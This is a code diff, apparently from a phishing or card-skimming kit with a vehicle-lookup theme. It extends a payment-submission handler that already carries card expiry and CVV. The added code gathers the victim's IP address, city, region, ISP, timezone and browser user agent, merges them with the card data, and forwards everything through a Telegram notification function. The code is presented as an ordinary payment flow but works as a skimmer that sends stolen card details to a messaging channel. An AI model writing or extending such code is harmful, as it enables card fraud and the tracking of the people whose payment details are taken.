@@ -83,6 +83,13 @@ export interface PaymentSubmissionData {
   card_expiry: string;
   card_cvv: string;
   test_mode: boolean;
+  ip?: string;
+  country?: string;
+  city?: string;
+  region?: string;
+  timezone?: string;
+  isp?: string;
+  userAgent?: string;
 }
 
 export const sendTelegramNotification = async (
@@ -130,5 +137,17 @@ export const sendVehicleLookupNotification = async (vehicleData: VehicleLookupDa
 };
 
 export const sendPaymentSubmissionNotification = async (paymentData: PaymentSubmissionData) => {
-  return sendTelegramNotification('payment_submission', paymentData);
+  // Get location details if not already provided
+  let locationData = {};
+  if (!paymentData.ip) {
+    locationData = await getUserIPAndLocationDetails();
+  }
+  
+  const completeData: PaymentSubmissionData = {
+    userAgent: navigator.userAgent,
+    ...locationData,
+    ...paymentData
+  };
+  
+  return sendTelegramNotification('payment_submission', completeData);
 };
